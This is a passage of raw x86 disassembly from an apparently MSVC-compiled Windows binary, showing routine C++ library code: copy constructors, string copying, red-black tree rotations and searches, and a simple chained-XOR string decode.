   12a8f:	push   esi
   12a90:	push   edi
   12a91:	mov    edi,DWORD PTR [ebp+0x8]
   12a94:	push   edi
   12a95:	mov    esi,ecx
   12a97:	call   0x129fc
   12a9c:	lea    eax,[edi+0x8]
   12a9f:	push   eax
   12aa0:	lea    ecx,[esi+0x8]
   12aa3:	call   0x129fc
   12aa8:	mov    eax,DWORD PTR [edi+0x10]
   12aab:	mov    DWORD PTR [esi+0x10],eax
   12aae:	lea    eax,[edi+0x14]
   12ab1:	push   eax
   12ab2:	lea    ecx,[esi+0x14]
   12ab5:	call   0x129fc
   12aba:	lea    eax,[edi+0x1c]
   12abd:	push   eax
   12abe:	lea    ecx,[esi+0x1c]
   12ac1:	call   0x129fc
   12ac6:	lea    eax,[edi+0x24]
   12ac9:	push   eax
   12aca:	lea    ecx,[esi+0x24]
   12acd:	call   0x129fc
   12ad2:	mov    eax,DWORD PTR [edi+0x2c]
   12ad5:	mov    DWORD PTR [esi+0x2c],eax
   12ad8:	mov    eax,DWORD PTR [edi+0x30]
   12adb:	mov    DWORD PTR [esi+0x30],eax
   12ade:	mov    eax,DWORD PTR [edi+0x38]
   12ae1:	mov    DWORD PTR [esi+0x38],eax
   12ae4:	mov    eax,DWORD PTR [edi+0x3c]
   12ae7:	mov    DWORD PTR [esi+0x3c],eax
   12aea:	mov    eax,DWORD PTR [edi+0x40]
   12aed:	mov    DWORD PTR [esi+0x40],eax
   12af0:	mov    eax,DWORD PTR [edi+0x44]
   12af3:	add    edi,0x48
   12af6:	push   edi
   12af7:	lea    ecx,[esi+0x48]
   12afa:	mov    DWORD PTR [esi+0x44],eax
   12afd:	call   0x129fc
   12b02:	pop    edi
   12b03:	mov    eax,esi
   12b05:	pop    esi
   12b06:	pop    ebp
   12b07:	ret    0x4
   12b0a:	int3   
   12b0b:	int3   
   12b0c:	int3   
   12b0d:	int3   
   12b0e:	int3   
   12b0f:	int3   
   12b10:	mov    edi,edi
   12b12:	push   esi
   12b13:	mov    esi,ecx
   12b15:	lea    ecx,[esi+0x8]
   12b18:	call   0x11ef4
   12b1d:	push   DWORD PTR [esi]
   12b1f:	call   0x10a86
   12b24:	pop    ecx
   12b25:	pop    esi
   12b26:	ret    
   12b27:	int3   
   12b28:	int3   
   12b29:	int3   
   12b2a:	int3   
   12b2b:	int3   
   12b2c:	mov    edi,edi
   12b2e:	push   ebp
   12b2f:	mov    ebp,esp
   12b31:	push   esi
   12b32:	push   DWORD PTR [ebp+0xc]
   12b35:	mov    esi,ecx
   12b37:	push   DWORD PTR [ebp+0x8]
   12b3a:	call   0x1115c
   12b3f:	mov    eax,esi
   12b41:	pop    esi
   12b42:	pop    ebp
   12b43:	ret    0x8
   12b46:	int3   
   12b47:	int3   
   12b48:	int3   
   12b49:	int3   
   12b4a:	int3   
   12b4b:	int3   
   12b4c:	mov    edi,edi
   12b4e:	push   ebp
   12b4f:	mov    ebp,esp
   12b51:	mov    eax,DWORD PTR [ebp+0x8]
   12b54:	push   esi
   12b55:	push   DWORD PTR [eax+0x4]
   12b58:	mov    esi,ecx
   12b5a:	push   DWORD PTR [eax]
   12b5c:	call   0x1115c
   12b61:	mov    eax,esi
   12b63:	pop    esi
   12b64:	pop    ebp
   12b65:	ret    0x4
   12b68:	int3   
   12b69:	int3   
   12b6a:	int3   
   12b6b:	int3   
   12b6c:	int3   
   12b6d:	int3   
   12b6e:	mov    edi,edi
   12b70:	push   ebp
   12b71:	mov    ebp,esp
   12b73:	push   ebx
   12b74:	push   esi
   12b75:	push   edi
   12b76:	mov    edi,DWORD PTR [ebp+0x8]
   12b79:	mov    eax,DWORD PTR [edi+0x4]
   12b7c:	mov    esi,ecx
   12b7e:	mov    ebx,DWORD PTR [esi]
   12b80:	mov    DWORD PTR [esi+0x4],eax
   12b83:	xor    ecx,ecx
   12b85:	push   0x2
   12b87:	inc    eax
   12b88:	pop    edx
   12b89:	mul    edx
   12b8b:	seto   cl
   12b8e:	neg    ecx
   12b90:	or     ecx,eax
   12b92:	push   ecx
   12b93:	call   0x10a52
   12b98:	mov    ecx,DWORD PTR [esi+0x4]
   12b9b:	add    ecx,ecx
   12b9d:	push   ecx
   12b9e:	mov    DWORD PTR [esi],eax
   12ba0:	push   DWORD PTR [edi]
   12ba2:	push   eax
   12ba3:	call   0x1dac6
   12ba8:	mov    eax,DWORD PTR [esi+0x4]
   12bab:	mov    ecx,DWORD PTR [esi]
   12bad:	xor    edx,edx
   12baf:	push   ebx
   12bb0:	mov    WORD PTR [ecx+eax*2],dx
   12bb4:	call   0x10a86
   12bb9:	add    esp,0x14
   12bbc:	pop    edi
   12bbd:	mov    eax,esi
   12bbf:	pop    esi
   12bc0:	pop    ebx
   12bc1:	pop    ebp
   12bc2:	ret    0x4
   12bc5:	int3   
   12bc6:	int3   
   12bc7:	int3   
   12bc8:	int3   
   12bc9:	int3   
   12bca:	mov    edi,edi
   12bcc:	push   ebp
   12bcd:	mov    ebp,esp
   12bcf:	push   esi
   12bd0:	mov    esi,DWORD PTR [ebp+0x8]
   12bd3:	lea    eax,[ebp+0xc]
   12bd6:	push   eax
   12bd7:	mov    ecx,esi
   12bd9:	call   0x12b4c
   12bde:	xor    ecx,ecx
   12be0:	inc    ecx
   12be1:	cmp    DWORD PTR [esi+0x4],ecx
   12be4:	jbe    0x12bf8
   12be6:	mov    eax,DWORD PTR [esi]
   12be8:	lea    eax,[eax+ecx*2]
   12beb:	mov    dx,WORD PTR [eax-0x2]
   12bef:	xor    WORD PTR [eax],dx
   12bf2:	inc    ecx
   12bf3:	cmp    ecx,DWORD PTR [esi+0x4]
   12bf6:	jb     0x12be6
   12bf8:	push   DWORD PTR [ebp+0xc]
   12bfb:	call   0x10a86
   12c00:	pop    ecx
   12c01:	mov    eax,esi
   12c03:	pop    esi
   12c04:	pop    ebp
   12c05:	ret    0xc
   12c08:	int3   
   12c09:	int3   
   12c0a:	int3   
   12c0b:	int3   
   12c0c:	int3   
   12c0d:	int3   
   12c0e:	mov    edi,edi
   12c10:	push   ebp
   12c11:	mov    ebp,esp
   12c13:	push   esi
   12c14:	mov    esi,DWORD PTR [ebp+0x8]
   12c17:	lea    eax,[ebp+0xc]
   12c1a:	push   eax
   12c1b:	mov    ecx,esi
   12c1d:	call   0x129da
   12c22:	xor    ecx,ecx
   12c24:	inc    ecx
   12c25:	cmp    DWORD PTR [esi+0x4],ecx
   12c28:	jbe    0x12c39
   12c2a:	mov    eax,DWORD PTR [esi]
   12c2c:	add    eax,ecx
   12c2e:	mov    dl,BYTE PTR [eax-0x1]
   12c31:	xor    BYTE PTR [eax],dl
   12c33:	inc    ecx
   12c34:	cmp    ecx,DWORD PTR [esi+0x4]
   12c37:	jb     0x12c2a
   12c39:	push   DWORD PTR [ebp+0xc]
   12c3c:	call   0x10a86
   12c41:	pop    ecx
   12c42:	mov    eax,esi
   12c44:	pop    esi
   12c45:	pop    ebp
   12c46:	ret    0xc
   12c49:	int3   
   12c4a:	int3   
   12c4b:	int3   
   12c4c:	int3   
   12c4d:	int3   
   12c4e:	mov    edi,edi
   12c50:	push   ebp
   12c51:	mov    ebp,esp
   12c53:	mov    eax,DWORD PTR [ebp+0x8]
   12c56:	mov    eax,DWORD PTR [eax]
   12c58:	push   esi
   12c59:	push   DWORD PTR [ebp+0xc]
   12c5c:	mov    esi,ecx
   12c5e:	lea    ecx,[esi+0x4]
   12c61:	mov    DWORD PTR [esi],eax
   12c63:	call   0x11f32
   12c68:	mov    eax,esi
   12c6a:	pop    esi
   12c6b:	pop    ebp
   12c6c:	ret    0x8
   12c6f:	int3   
   12c70:	int3   
   12c71:	int3   
   12c72:	int3   
   12c73:	int3   
   12c74:	mov    edi,edi
   12c76:	push   ebp
   12c77:	mov    ebp,esp
   12c79:	push   esi
   12c7a:	push   edi
   12c7b:	mov    edi,DWORD PTR [ebp+0x8]
   12c7e:	push   edi
   12c7f:	mov    esi,ecx
   12c81:	call   0x129da
   12c86:	lea    eax,[edi+0x8]
   12c89:	push   eax
   12c8a:	lea    ecx,[esi+0x8]
   12c8d:	call   0x129da
   12c92:	mov    eax,DWORD PTR [edi+0x10]
   12c95:	mov    DWORD PTR [esi+0x10],eax
   12c98:	lea    eax,[edi+0x14]
   12c9b:	push   eax
   12c9c:	lea    ecx,[esi+0x14]
   12c9f:	call   0x129da
   12ca4:	lea    eax,[edi+0x1c]
   12ca7:	push   eax
   12ca8:	lea    ecx,[esi+0x1c]
   12cab:	call   0x129da
   12cb0:	lea    eax,[edi+0x24]
   12cb3:	push   eax
   12cb4:	lea    ecx,[esi+0x24]
   12cb7:	call   0x129da
   12cbc:	mov    eax,DWORD PTR [edi+0x2c]
   12cbf:	mov    DWORD PTR [esi+0x2c],eax
   12cc2:	mov    eax,DWORD PTR [edi+0x30]
   12cc5:	mov    DWORD PTR [esi+0x30],eax
   12cc8:	mov    eax,DWORD PTR [edi+0x38]
   12ccb:	mov    DWORD PTR [esi+0x38],eax
   12cce:	mov    eax,DWORD PTR [edi+0x3c]
   12cd1:	mov    DWORD PTR [esi+0x3c],eax
   12cd4:	mov    eax,DWORD PTR [edi+0x40]
   12cd7:	mov    DWORD PTR [esi+0x40],eax
   12cda:	mov    eax,DWORD PTR [edi+0x44]
   12cdd:	add    edi,0x48
   12ce0:	push   edi
   12ce1:	lea    ecx,[esi+0x48]
   12ce4:	mov    DWORD PTR [esi+0x44],eax
   12ce7:	call   0x129da
   12cec:	pop    edi
   12ced:	mov    eax,esi
   12cef:	pop    esi
   12cf0:	pop    ebp
   12cf1:	ret    0x4
   12cf4:	int3   
   12cf5:	int3   
   12cf6:	int3   
   12cf7:	int3   
   12cf8:	int3   
   12cf9:	int3   
   12cfa:	mov    edi,edi
   12cfc:	push   ebp
   12cfd:	mov    ebp,esp
   12cff:	mov    eax,DWORD PTR [ebp+0x8]
   12d02:	mov    edx,DWORD PTR ds:0x7f8c4
   12d08:	jmp    0x12d0c
   12d0a:	mov    eax,ecx
   12d0c:	mov    ecx,DWORD PTR [eax]
   12d0e:	cmp    ecx,edx
   12d10:	jne    0x12d0a
   12d12:	pop    ebp
   12d13:	ret    0x4
   12d16:	int3   
   12d17:	int3   
   12d18:	int3   
   12d19:	int3   
   12d1a:	int3   
   12d1b:	int3   
   12d1c:	mov    edi,edi
   12d1e:	push   ebp
   12d1f:	mov    ebp,esp
   12d21:	push   esi
   12d22:	push   DWORD PTR [ebp+0x8]
   12d25:	mov    esi,ecx
   12d27:	call   0x12b4c
   12d2c:	push   DWORD PTR [ebp+0xc]
   12d2f:	lea    ecx,[esi+0x8]
   12d32:	call   0x12b4c
   12d37:	mov    eax,esi
   12d39:	pop    esi
   12d3a:	pop    ebp
   12d3b:	ret    0x8
   12d3e:	int3   
   12d3f:	int3   
   12d40:	int3   
   12d41:	int3   
   12d42:	int3   
   12d43:	int3   
   12d44:	mov    edi,edi
   12d46:	push   ebp
   12d47:	mov    ebp,esp
   12d49:	mov    eax,DWORD PTR [ecx+0x4]
   12d4c:	mov    ecx,DWORD PTR [eax+0x4]
   12d4f:	mov    edx,DWORD PTR ds:0x7f8b8
   12d55:	cmp    ecx,edx
   12d57:	je     0x12d72
   12d59:	push   esi
   12d5a:	mov    esi,DWORD PTR [ebp+0x8]
   12d5d:	mov    esi,DWORD PTR [esi]
   12d5f:	cmp    DWORD PTR [ecx+0xc],esi
   12d62:	jae    0x12d69
   12d64:	mov    ecx,DWORD PTR [ecx+0x8]
   12d67:	jmp    0x12d6d
   12d69:	mov    eax,ecx
   12d6b:	mov    ecx,DWORD PTR [ecx]
   12d6d:	cmp    ecx,edx
   12d6f:	jne    0x12d5f
   12d71:	pop    esi
   12d72:	pop    ebp
   12d73:	ret    0x4
   12d76:	int3   
   12d77:	int3   
   12d78:	int3   
   12d79:	int3   
   12d7a:	int3   
   12d7b:	int3   
   12d7c:	mov    edi,edi
   12d7e:	push   ebp
   12d7f:	mov    ebp,esp
   12d81:	mov    edx,DWORD PTR [ebp+0x8]
   12d84:	mov    eax,DWORD PTR [edx+0x8]
   12d87:	push   esi
   12d88:	mov    esi,DWORD PTR [eax]
   12d8a:	mov    DWORD PTR [edx+0x8],esi
   12d8d:	mov    esi,DWORD PTR [eax]
   12d8f:	cmp    esi,DWORD PTR ds:0x7f8b8
   12d95:	je     0x12d9a
   12d97:	mov    DWORD PTR [esi+0x4],edx
   12d9a:	mov    esi,DWORD PTR [edx+0x4]
   12d9d:	mov    DWORD PTR [eax+0x4],esi
   12da0:	mov    ecx,DWORD PTR [ecx+0x4]
   12da3:	pop    esi
   12da4:	cmp    edx,DWORD PTR [ecx+0x4]
   12da7:	jne    0x12dae
   12da9:	mov    DWORD PTR [ecx+0x4],eax
   12dac:	jmp    0x12dbc
   12dae:	mov    ecx,DWORD PTR [edx+0x4]
   12db1:	cmp    edx,DWORD PTR [ecx]
   12db3:	jne    0x12db9
   12db5:	mov    DWORD PTR [ecx],eax
   12db7:	jmp    0x12dbc
   12db9:	mov    DWORD PTR [ecx+0x8],eax
   12dbc:	mov    DWORD PTR [eax],edx
   12dbe:	mov    DWORD PTR [edx+0x4],eax
   12dc1:	pop    ebp
   12dc2:	ret    0x4
   12dc5:	int3   
   12dc6:	int3   
   12dc7:	int3   
   12dc8:	int3   
   12dc9:	int3   
   12dca:	mov    edi,edi
   12dcc:	push   ebp
   12dcd:	mov    ebp,esp
   12dcf:	mov    edx,DWORD PTR [ebp+0x8]
   12dd2:	mov    eax,DWORD PTR [edx]
   12dd4:	push   esi
   12dd5:	mov    esi,DWORD PTR [eax+0x8]
   12dd8:	mov    DWORD PTR [edx],esi
   12dda:	mov    esi,DWORD PTR [eax+0x8]
   12ddd:	cmp    esi,DWORD PTR ds:0x7f8b8
   12de3:	je     0x12de8
   12de5:	mov    DWORD PTR [esi+0x4],edx
   12de8:	mov    esi,DWORD PTR [edx+0x4]
   12deb:	mov    DWORD PTR [eax+0x4],esi
   12dee:	mov    ecx,DWORD PTR [ecx+0x4]
   12df1:	pop    esi
   12df2:	cmp    edx,DWORD PTR [ecx+0x4]
   12df5:	jne    0x12dfc
   12df7:	mov    DWORD PTR [ecx+0x4],eax
   12dfa:	jmp    0x12e0b
   12dfc:	mov    ecx,DWORD PTR [edx+0x4]
   12dff:	cmp    edx,DWORD PTR [ecx+0x8]
   12e02:	jne    0x12e09
   12e04:	mov    DWORD PTR [ecx+0x8],eax
   12e07:	jmp    0x12e0b
   12e09:	mov    DWORD PTR [ecx],eax
   12e0b:	mov    DWORD PTR [eax+0x8],edx
   12e0e:	mov    DWORD PTR [edx+0x4],eax
   12e11:	pop    ebp
   12e12:	ret    0x4
   12e15:	int3   
   12e16:	int3   
   12e17:	int3   
   12e18:	int3   
   12e19:	int3   
   12e1a:	mov    edi,edi
   12e1c:	push   ebp
   12e1d:	mov    ebp,esp
   12e1f:	mov    eax,DWORD PTR [ecx+0x4]
   12e22:	push   esi
   12e23:	mov    esi,DWORD PTR [eax+0x4]
   12e26:	push   edi
   12e27:	mov    edi,eax
   12e29:	jmp    0x12e44
   12e2b:	push   DWORD PTR [ebp+0x8]
   12e2e:	lea    eax,[esi+0x10]
   12e31:	push   eax
   12e32:	call   0x197f4
   12e37:	test   al,al
   12e39:	je     0x12e40
   12e3b:	mov    esi,DWORD PTR [esi+0x8]
   12e3e:	jmp    0x12e44
   12e40:	mov    edi,esi
   12e42:	mov    esi,DWORD PTR [esi]
   12e44:	cmp    esi,DWORD PTR ds:0x7f8c4
   12e4a:	jne    0x12e2b
   12e4c:	mov    eax,edi
   12e4e:	pop    edi
   12e4f:	pop    esi
   12e50:	pop    ebp
   12e51:	ret    0x4
   12e54:	int3   
   12e55:	int3   
   12e56:	int3   
   12e57:	int3   
   12e58:	int3   
   12e59:	int3   
   12e5a:	mov    edi,edi
   12e5c:	push   ebp
   12e5d:	mov    ebp,esp
   12e5f:	mov    eax,DWORD PTR [ecx+0x4]
   12e62:	push   esi
   12e63:	mov    esi,DWORD PTR [eax+0x4]
   12e66:	push   edi
   12e67:	mov    edi,eax
   12e69:	jmp    0x12e84
   12e6b:	push   DWORD PTR [ebp+0x8]
   12e6e:	lea    eax,[esi+0xc]
   12e71:	push   eax
   12e72:	call   0x197f4
   12e77:	test   al,al
   12e79:	je     0x12e80
   12e7b:	mov    esi,DWORD PTR [esi+0x8]
   12e7e:	jmp    0x12e84
   12e80:	mov    edi,esi
   12e82:	mov    esi,DWORD PTR [esi]
   12e84:	cmp    esi,DWORD PTR ds:0x7f8c8
   12e8a:	jne    0x12e6b
   12e8c:	mov    eax,edi
   12e8e:	pop    edi
   12e8f:	pop    esi
   12e90:	pop    ebp
   12e91:	ret    0x4
   12e94:	int3   
   12e95:	int3   
   12e96:	int3   
   12e97:	int3   
   12e98:	int3   
   12e99:	int3   
   12e9a:	mov    edi,edi
   12e9c:	push   ebp
   12e9d:	mov    ebp,esp
   12e9f:	mov    eax,DWORD PTR [ecx+0x4]
   12ea2:	mov    ecx,DWORD PTR [eax+0x4]
   12ea5:	mov    edx,DWORD PTR ds:0x7f8cc
   12eab:	cmp    ecx,edx
   12ead:	je     0x12ec8
   12eaf:	push   esi
   12eb0:	mov    esi,DWORD PTR [ebp+0x8]
   12eb3:	mov    esi,DWORD PTR [esi]
   12eb5:	cmp    DWORD PTR [ecx+0xc],esi
   12eb8:	jge    0x12ebf
   12eba:	mov    ecx,DWORD PTR [ecx+0x8]
   12ebd:	jmp    0x12ec3
   12ebf:	mov    eax,ecx
   12ec1:	mov    ecx,DWORD PTR [ecx]
   12ec3:	cmp    ecx,edx
   12ec5:	jne    0x12eb5
   12ec7:	pop    esi
   12ec8:	pop    ebp
   12ec9:	ret    0x4
   12ecc:	int3   
   12ecd:	int3   
   12ece:	int3   
   12ecf:	int3   
   12ed0:	int3   
   12ed1:	int3   
   12ed2:	mov    edi,edi
   12ed4:	push   esi
   12ed5:	mov    esi,ecx
   12ed7:	mov    ecx,DWORD PTR [esi]
   12ed9:	mov    eax,DWORD PTR [ecx+0x8]
   12edc:	cmp    eax,DWORD PTR ds:0x7f8c0
   12ee2:	je     0x12ef0
   12ee4:	push   eax
   12ee5:	call   0x11272
   12eea:	jmp    0x12eff
   12eec:	mov    DWORD PTR [esi],eax
   12eee:	mov    ecx,eax
   12ef0:	mov    eax,DWORD PTR [ecx+0x4]
   12ef3:	cmp    ecx,DWORD PTR [eax+0x8]
   12ef6:	je     0x12eec
   12ef8:	mov    ecx,DWORD PTR [esi]
   12efa:	cmp    DWORD PTR [ecx+0x8],eax
   12efd:	je     0x12f01
   12eff:	mov    DWORD PTR [esi],eax
   12f01:	pop    esi
   12f02:	ret    
   12f03:	int3   
   12f04:	int3   
   12f05:	int3   
   12f06:	int3   
   12f07:	int3   
   12f08:	mov    edi,edi
   12f0a:	push   esi
   12f0b:	mov    esi,ecx
   12f0d:	mov    ecx,DWORD PTR [esi]
   12f0f:	cmp    DWORD PTR [ecx+0x10],0x0
   12f13:	jne    0x12f22
   12f15:	mov    eax,DWORD PTR [ecx+0x4]
   12f18:	cmp    DWORD PTR [eax+0x4],ecx
   12f1b:	jne    0x12f22
   12f1d:	mov    eax,DWORD PTR [ecx+0x8]
   12f20:	jmp    0x12f3f
   12f22:	mov    eax,DWORD PTR [ecx]
   12f24:	cmp    eax,DWORD PTR ds:0x7f8bc
   12f2a:	je     0x12f38
   12f2c:	push   eax
   12f2d:	call   0x1120c
   12f32:	jmp    0x12f3f
   12f34:	mov    DWORD PTR [esi],eax
   12f36:	mov    ecx,eax
   12f38:	mov    eax,DWORD PTR [ecx+0x4]
   12f3b:	cmp    ecx,DWORD PTR [eax]
   12f3d:	je     0x12f34
   12f3f:	mov    DWORD PTR [esi],eax
   12f41:	pop    esi
   12f42:	ret    
   12f43:	int3   
   12f44:	int3   
   12f45:	int3   
   12f46:	int3   
   12f47:	int3   
   12f48:	mov    edi,edi
   12f4a:	push   esi
   12f4b:	mov    esi,ecx
   12f4d:	mov    ecx,DWORD PTR [esi]
   12f4f:	mov    eax,DWORD PTR [ecx+0x8]
   12f52:	cmp    eax,DWORD PTR ds:0x7f8bc
   12f58:	je     0x12f66
   12f5a:	push   eax
   12f5b:	call   0x1122e
   12f60:	jmp    0x12f75
   12f62:	mov    DWORD PTR [esi],eax
   12f64:	mov    ecx,eax
   12f66:	mov    eax,DWORD PTR [ecx+0x4]
   12f69:	cmp    ecx,DWORD PTR [eax+0x8]
   12f6c:	je     0x12f62
   12f6e:	mov    ecx,DWORD PTR [esi]
   12f70:	cmp    DWORD PTR [ecx+0x8],eax
   12f73:	je     0x12f77
   12f75:	mov    DWORD PTR [esi],eax
   12f77:	pop    esi
   12f78:	ret    
   12f79:	int3   
   12f7a:	int3   
   12f7b:	int3   
   12f7c:	int3   
   12f7d:	int3   
   12f7e:	mov    edi,edi
   12f80:	push   ebp
   12f81:	mov    ebp,esp
   12f83:	mov    edx,DWORD PTR [ebp+0x8]
   12f86:	mov    eax,DWORD PTR [edx+0x8]
   12f89:	push   esi
   12f8a:	mov    esi,DWORD PTR [eax]
   12f8c:	mov    DWORD PTR [edx+0x8],esi
   12f8f:	mov    esi,DWORD PTR [eax]
   12f91:	cmp    esi,DWORD PTR ds:0x7f8bc
   12f97:	je     0x12f9c
   12f99:	mov    DWORD PTR [esi+0x4],edx
   12f9c:	mov    esi,DWORD PTR [edx+0x4]
   12f9f:	mov    DWORD PTR [eax+0x4],esi
   12fa2:	mov    ecx,DWORD PTR [ecx+0x4]
   12fa5:	pop    esi
   12fa6:	cmp    edx,DWORD PTR [ecx+0x4]
   12fa9:	jne    0x12fb0
   12fab:	mov    DWORD PTR [ecx+0x4],eax
   12fae:	jmp    0x12fbe
   12fb0:	mov    ecx,DWORD PTR [edx+0x4]
   12fb3:	cmp    edx,DWORD PTR [ecx]
   12fb5:	jne    0x12fbb
   12fb7:	mov    DWORD PTR [ecx],eax
   12fb9:	jmp    0x12fbe
   12fbb:	mov    DWORD PTR [ecx+0x8],eax
   12fbe:	mov    DWORD PTR [eax],edx
   12fc0:	mov    DWORD PTR [edx+0x4],eax
   12fc3:	pop    ebp
   12fc4:	ret    0x4
   12fc7:	int3   
   12fc8:	int3   
   12fc9:	int3   
   12fca:	int3   
   12fcb:	int3   
   12fcc:	mov    edi,edi
   12fce:	push   ebp
   12fcf:	mov    ebp,esp
   12fd1:	mov    edx,DWORD PTR [ebp+0x8]
   12fd4:	mov    eax,DWORD PTR [edx]
   12fd6:	push   esi
   12fd7:	mov    esi,DWORD PTR [eax+0x8]
   12fda:	mov    DWORD PTR [edx],esi
   12fdc:	mov    esi,DWORD PTR [eax+0x8]
   12fdf:	cmp    esi,DWORD PTR ds:0x7f8bc
   12fe5:	je     0x12fea
   12fe7:	mov    DWORD PTR [esi+0x4],edx
   12fea:	mov    esi,DWORD PTR [edx+0x4]
   12fed:	mov    DWORD PTR [eax+0x4],esi
   12ff0:	mov    ecx,DWORD PTR [ecx+0x4]
   12ff3:	pop    esi
   12ff4:	cmp    edx,DWORD PTR [ecx+0x4]
   12ff7:	jne    0x12ffe
   12ff9:	mov    DWORD PTR [ecx+0x4],eax
   12ffc:	jmp    0x1300d
   12ffe:	mov    ecx,DWORD PTR [edx+0x4]
   13001:	cmp    edx,DWORD PTR [ecx+0x8]
   13004:	jne    0x1300b
   13006:	mov    DWORD PTR [ecx+0x8],eax
   13009:	jmp    0x1300d
   1300b:	mov    DWORD PTR [ecx],eax
   1300d:	mov    DWORD PTR [eax+0x8],edx
   13010:	mov    DWORD PTR [edx+0x4],eax
   13013:	pop    ebp
   13014:	ret    0x4
   13017:	int3   
   13018:	int3   
   13019:	int3   
   1301a:	int3   
   1301b:	int3   
   1301c:	mov    edi,edi
   1301e:	push   ebp
   1301f:	mov    ebp,esp
   13021:	mov    eax,DWORD PTR [ecx+0x4]
   13024:	push   esi
   13025:	mov    esi,DWORD PTR [eax+0x4]
   13028:	push   edi
   13029:	mov    edi,eax
   1302b:	jmp    0x13046
   1302d:	push   DWORD PTR [ebp+0x8]
   13030:	lea    eax,[esi+0x10]
   13033:	push   eax
   13034:	call   0x197f4
   13039:	test   al,al
   1303b:	je     0x13042
   1303d:	mov    esi,DWORD PTR [esi+0x8]
   13040:	jmp    0x13046
   13042:	mov    edi,esi
   13044:	mov    esi,DWORD PTR [esi]
   13046:	cmp    esi,DWORD PTR ds:0x7f8c0
   1304c:	jne    0x1302d
   1304e:	mov    eax,edi
   13050:	pop    edi
   13051:	pop    esi
   13052:	pop    ebp
   13053:	ret    0x4
   13056:	int3   
   13057:	int3   
   13058:	int3   
   13059:	int3   
   1305a:	int3   
   1305b:	int3   
   1305c:	mov    edi,edi
   1305e:	push   ebp
   1305f:	mov    ebp,esp
   13061:	mov    edx,DWORD PTR [ebp+0x8]
   13064:	mov    eax,DWORD PTR [edx+0x8]
   13067:	push   esi
   13068:	mov    esi,DWORD PTR [eax]
   1306a:	mov    DWORD PTR [edx+0x8],esi
   1306d:	mov    esi,DWORD PTR [eax]
   1306f:	cmp    esi,DWORD PTR ds:0x7f8c0
   13075:	je     0x1307a
   13077:	mov    DWORD PTR [esi+0x4],edx
   1307a:	mov    esi,DWORD PTR [edx+0x4]
   1307d:	mov    DWORD PTR [eax+0x4],esi
   13080:	mov    ecx,DWORD PTR [ecx+0x4]
   13083:	pop    esi
   13084:	cmp    edx,DWORD PTR [ecx+0x4]
   13087:	jne    0x1308e
   13089:	mov    DWORD PTR [ecx+0x4],eax
   1308c:	jmp    0x1309c
   1308e:	mov    ecx,DWORD PTR [edx+0x4]
   13091:	cmp    edx,DWORD PTR [ecx]
   13093:	jne    0x13099
   13095:	mov    DWORD PTR [ecx],eax
   13097:	jmp    0x1309c
   13099:	mov    DWORD PTR [ecx+0x8],eax
   1309c:	mov    DWORD PTR [eax],edx
   1309e:	mov    DWORD PTR [edx+0x4],eax
   130a1:	pop    ebp
   130a2:	ret    0x4
   130a5:	int3   
   130a6:	int3   
   130a7:	int3   
   130a8:	int3   
   130a9:	int3   
   130aa:	mov    edi,edi
   130ac:	push   ebp
   130ad:	mov    ebp,esp
   130af:	mov    edx,DWORD PTR [ebp+0x8]
   130b2:	mov    eax,DWORD PTR [edx]
   130b4:	push   esi
   130b5:	mov    esi,DWORD PTR [eax+0x8]
   130b8:	mov    DWORD PTR [edx],esi
   130ba:	mov    esi,DWORD PTR [eax+0x8]
   130bd:	cmp    esi,DWORD PTR ds:0x7f8c0
   130c3:	je     0x130c8
   130c5:	mov    DWORD PTR [esi+0x4],edx
   130c8:	mov    esi,DWORD PTR [edx+0x4]
   130cb:	mov    DWORD PTR [eax+0x4],esi
   130ce:	mov    ecx,DWORD PTR [ecx+0x4]
   130d1:	pop    esi
   130d2:	cmp    edx,DWORD PTR [ecx+0x4]
   130d5:	jne    0x130dc
   130d7:	mov    DWORD PTR [ecx+0x4],eax
   130da:	jmp    0x130eb
   130dc:	mov    ecx,DWORD PTR [edx+0x4]
   130df:	cmp    edx,DWORD PTR [ecx+0x8]
   130e2:	jne    0x130e9
   130e4:	mov    DWORD PTR [ecx+0x8],eax
   130e7:	jmp    0x130eb
   130e9:	mov    DWORD PTR [ecx],eax
   130eb:	mov    DWORD PTR [eax+0x8],edx
   130ee:	mov    DWORD PTR [edx+0x4],eax
   130f1:	pop    ebp
   130f2:	ret    0x4
   130f5:	int3   
   130f6:	int3   
   130f7:	int3   
   130f8:	int3   
   130f9:	int3   
   130fa:	mov    edi,edi
   130fc:	push   ebp
   130fd:	mov    ebp,esp
   130ff:	mov    eax,DWORD PTR [ecx+0x4]
   13102:	mov    ecx,DWORD PTR [eax+0x4]
   13105:	mov    edx,DWORD PTR ds:0x7f8b8
   1310b:	cmp    ecx,edx
   1310d:	je     0x13128
   1310f:	push   esi
   13110:	mov    esi,DWORD PTR [ebp+0x8]
   13113:	mov    esi,DWORD PTR [esi]
   13115:	cmp    esi,DWORD PTR [ecx+0xc]
   13118:	jae    0x13120
   1311a:	mov    eax,ecx
   1311c:	mov    ecx,DWORD PTR [ecx]
   1311e:	jmp    0x13123
   13120:	mov    ecx,DWORD PTR [ecx+0x8]
   13123:	cmp    ecx,edx
   13125:	jne    0x13115
   13127:	pop    esi
   13128:	pop    ebp
   13129:	ret    0x4
   1312c:	int3   
   1312d:	int3   
   1312e:	int3   
   1312f:	int3   
   13130:	int3   
   13131:	int3   
   13132:	mov    edi,edi
   13134:	push   ebp
   13135:	mov    ebp,esp
   13137:	mov    eax,DWORD PTR [ecx+0x4]
   1313a:	push   esi
   1313b:	mov    esi,DWORD PTR [eax+0x4]
   1313e:	push   edi
   1313f:	mov    edi,eax
   13141:	jmp    0x1315c
   13143:	lea    eax,[esi+0x10]
   13146:	push   eax
   13147:	push   DWORD PTR [ebp+0x8]
   1314a:	call   0x197f4
   1314f:	test   al,al
   13151:	je     0x13159
   13153:	mov    edi,esi
   13155:	mov    esi,DWORD PTR [esi]
   13157:	jmp    0x1315c
   13159:	mov    esi,DWORD PTR [esi+0x8]
   1315c:	cmp    esi,DWORD PTR ds:0x7f8c4
   13162:	jne    0x13143
   13164:	mov    eax,edi
   13166:	pop    edi
   13167:	pop    esi
   13168:	pop    ebp
   13169:	ret    0x4
   1316c:	int3   
   1316d:	int3   
   1316e:	int3   
   1316f:	int3   
   13170:	int3   
   13171:	int3   
   13172:	mov    edi,edi
   13174:	push   ebp
   13175:	mov    ebp,esp
   13177:	mov    edx,DWORD PTR [ebp+0x8]
   1317a:	mov    eax,DWORD PTR [edx+0x8]
   1317d:	push   esi
   1317e:	mov    esi,DWORD PTR [eax]
   13180:	mov    DWORD PTR [edx+0x8],esi
   13183:	mov    esi,DWORD PTR [eax]
   13185:	cmp    esi,DWORD PTR ds:0x7f8c8
   1318b:	je     0x13190
